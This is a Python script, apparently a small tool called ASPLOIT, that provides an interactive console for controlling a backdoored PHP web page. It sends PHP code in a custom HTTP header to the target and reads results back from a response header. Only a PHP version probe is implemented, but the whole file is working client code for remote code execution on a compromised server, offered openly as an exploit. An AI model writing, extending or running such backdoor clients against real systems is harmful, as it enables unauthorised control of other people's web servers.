#!/usr/bin/env python3
# @brief This python script will exploit a custom backdoor placed in on a
#       website endpoint.
import os  # system calls
import traceback  # Exception stack trace
import requests  # HTTP requests
import readline  # command history and other features
from abc import ABC, abstractmethod  # abstract methods and inheritance

# @brief Exception raised to exit program.
class ExitException(Exception):
    pass

# @brief Exception raised for command errors. Must be raised with a message.
class CommandException(Exception):
    pass

"""
@brief The CommandProcessor class accepts commands passed into it and processes
        it appropriately. Acts as base class for all shells.
"""
class CommandProcessor():
    """
    @brief constructs/initalizes a CommandProcessor instance.
    """
    def __init__(self):
        self.commands = {
            "help": { 
                "method": self._Base__help,
                "description": "Display the help screen."
            },
            "clear": {
                "method": self._Base__clear,
                "description": "Clear the screen."
            },
            "exit": {
                "method": self.__exit,
                "description": "Exit the program or exploit."
            }
        }

    """
    @brief Help command that prints commands and their usage.
    @param options The specific command to display help for.
    @pre \p options is specify a valid command, or nothing.
    @throw CommandException if the pre-condition is not met.
    """
    def _Base__help(self, options: str):
        # if no command is specified
        if len(options) == 0:
            for command in self.commands:
                print((f"    {'{0: <10}'.format(command)}"
                       f" {self.commands[command]['description']}"))
        else:  # look up specific command
            if options in self.commands:
                print((f"    "
                      f"{options}: {self.commands[options]['description']}"))
            else:  # command does not exist
                raise CommandException(f"    '{options}' command not found.")

    """
    @brief Command to clear screen.
    @param options Not used.
    """
    def _Base__clear(self, options: str):
        if os.name == 'nt':  # Windows
            os.system("cls")
        else:  # POSIX
            os.system("clear")

    """
    @brief Command to exit the program or the exploit shell.
    @param options Not used.
    @throw ExitException to exit the program.
    """
    def __exit(self, options: str):
        # exit shell
        raise ExitException()

    """
    @brief Processes a command string.
    @param command a string representing the whole command to be processed.
    @pre \p command is a valid command to be ran.
    @pre \p command has its preconditions met. 
    @throw CommandException if the command doesn't exist.
    """
    def process_command(self, command: str):
        split = command.split(" ", 1)
        base = split[0]

        options = ""
        if len(split) > 1:
            options = split[1]
        
        if base in self.commands:
            self.commands[base]["method"](options)
        else:
            raise CommandException(
                f"'{command.split(' ', 1)[0]}' command not found.")


class LocalCommandProcessor(CommandProcessor):
    def __init__(self):
        super().__init__()

        self.commands["exploit"] = { 
                "method": self.__exploit,
                "description": ("Start the exploit, "
                    "given the preconditions are met.")
            }
        
        self.commands["set"] = {
                "method": self.__set,
                "description": "Set or display exploit variables."
            }
            
        # exploit variables
        self.variables = {
            "TARGET_HOST": {"value": "", "required": True},
            "TARGET_PATH": {"value": "/", "required": True},
            "TARGET_TYPE": {"value": "PHP", "required": True},
            "METHOD": {"value": "GET", "required": True},
            "HEADER": {"value": "EXPLOIT", "required": True}
        }

        self.exploit: ExploitProcessor = None
        
    """
    @brief exploit the target machine.
    @param options Not used.
    @pre the required exploit variables have been set, and are valid.
    @throw CommandException if the pre-condition is not met.
    """
    def __exploit(self, options: str):
        if self.exploit_status() == True:
            raise CommandException("Already exploited target.")
        for var in self.variables:
            if (self.variables[var]["required"] and
                len(self.variables[var]["value"]) == 0):
                raise CommandException(f"{var} not set.")
        print((f"Attempting to exploit "
               f"{self.variables['TARGET_HOST']['value']} "
               f"at {self.variables['TARGET_PATH']['value']}"))
        
        self.exploit = (
            PHPExploitProcessor(self.variables['TARGET_HOST']['value'],
                             self.variables['TARGET_PATH']['value'],
                             self.variables['METHOD']['value'],
                             self.variables['HEADER']['value']))
        
    """
    @brief Command to set and display exploit variables.
    @param options the variable to be set and the value, if any.
    @throw CommandException if the variable does not exist, or if the value is
            invalid.
    """
    def __set(self, options: str):
        if len(options) == 0:  # list all variables
            print((f"{'{0: <20}'.format(f'VARIABLE')} "
                   f"{'{0: <50}'.format('VALUE')} "
                   f"REQUIRED"))
            for var in self.variables:
                print((f"{'{0: <20}'.format(var)} "
                       f"{'{0: <50}'.format(self.variables[var]['value'])} "
                       f"{str(self.variables[var]['required']).upper()}"))
        else:
            split = options.split(" ", 1)
            var = split[0].upper()
            if var in self.variables:
                value = ""
                if len(split) > 1:
                    value = split[1]
                self.variables[var]["value"] = value
                print(f"'{var}' set to '{value}'")
            else:
                raise CommandException(f"'{var}' is not a variable.")

    """
    @brief Getter for exploit status (True or False)
    @return bool for if we are in the exploit shell.
    """
    def exploit_status(self):
        return self.exploit is not None
    
    """
    @brief Processes a command string.
    @param command a string representing the whole command to be processed.
    @pre \p command is a valid command to be ran.
    @pre \p command has its preconditions met. 
    @throw CommandException if the command doesn't exist.
    """
    def process_command(self, command: str):
        if self.exploit_status():
            try:
                self.exploit.process_command(command)
            except ExitException:
                self.exploit = None
                print("Disconnected from exploit shell.")
        else:
            super().process_command(command)
    
"""
@brief The ExploitProcessor class is an abstract class that accepts commands
        passed into it and processes it to be sent to the backdoored server.
        Inherits from the CommandProcessor class. 
"""
class ExploitProcessor(CommandProcessor, ABC):
    """
    @brief Construct an ExploitProcessor.
    @param host the hostname of the backdoored server.
    @param path the path of the backdoored resource.
    @param method the HTTP method to access the backdoor with.
    @param header the HTTP header containing the backdoor.
    @pre \p host is a valid backdoored host.
    @pre \p path is the path to a valid backdoored resource.
    @pre \p method is allowed by the target.
    @pre \p header corresponds to the server side backdoor.
    @throw CommandException if the connection fails.
    """
    def __init__(self, host: str, path: str, method: str, header: str):
        super().__init__()
        self.commands["--version"] = {
            "method": self._Base__version,
            "description": "Get the version of PHP running."
        }
        self.directory = ""
        self.host = host
        self.path = path
        self.method = method
        self.header = header
        self._Base__make_connection()
        print("Exploit successful.")
        print("You can now run exploit commands.")
        print("For help, run 'help'")

    """
    @brief Abstract method to start a connection with the backdoored resource.
    @throw CommandException if the connection fails.
    """
    @abstractmethod
    def _Base__make_connection(self):
        pass
    
    """
    @brief Abstract method to start a connection with the backdoored resource.
    @param message the message to be sent to the backdoor.
    @pre \p message is proper and can be evaluated and will make the server
            respond with an HTTP header as defined by your exploit header.
    @throw CommandException if the server doesn't respond with success.
    """
    @abstractmethod
    def _Base__send_message(self, message: str):
        pass

    """
    @brief Abstract method to get the version of the backend software in the
            backdoored server.
    @throw CommandException if the server doesn't respond with success.
    """
    @abstractmethod
    def _Base__version(self, options):
        pass


"""
@brief The PHPExploitProcessor class is an abstract class that accepts commands
        passed into it and processes it to be sent to the backdoored PHP page.
        Inherits from the ExploitProcessor class. 
"""
class PHPExploitProcessor(ExploitProcessor):
    def __init__(self, host: str, path: str, method: str, header: str):
        super().__init__(host, path, method, header)

    """
    @brief See base class for details.
    """
    def _Base__version(self, options):
        res = self._Base__send_message(f"header('{self.header}: '"
                                       f" . phpversion());"
                                       f"exit;")
        print(res)

    """
    @brief See base class for details.
    """
    def _Base__make_connection(self):
        try:
            self._Base__send_message(f"header('{self.header}: ' . phpversion());"
                                     f"exit;")
        except:
            raise CommandException(f"Unable to exploit host. Make sure the "
                                   f"TARGET_HOST, TARGET_PATH, TARGET_TYPE, "
                                   f"and METHOD are correct.")
    
    """
    @brief See base class for details.
    """
    def _Base__send_message(self, message: str):
        url = f"{self.host}{self.path}"
        if not self.host.startswith("http"):
            url = "http://" + url
        try:
            response = requests.request(
                self.method,
                url,
                headers={ f"{self.header}": message }
            )
            if not response.ok:
                raise Exception()
            if not self.header in response.headers:
                raise CommandException(
                    f"No message sent back from server, your exploit is "
                    f"probably being filtered by a firewall.")
            return response.headers[self.header]
        except:
            raise CommandException(f"Unable to send message to server.")

if __name__ == "__main__":
    processor = LocalCommandProcessor()
    try:
        print("Welcome to ASPLOIT.")
        print("For help, run 'help'")
        while (True):
            pre = " > "
            if processor.exploit_status():
                pre = "sploit > "
            command = input(pre)
            try:
                processor.process_command(command)
            except CommandException as e:
                print(str(e))
    except ExitException:
        print("Exiting...")
    except KeyboardInterrupt:
        print()
        print("Keyboard Interrupt")
    except Exception:
        print("Unrecoverable Exception:")
        print(traceback.format_exc())
    finally:
        print("Goodbye.")

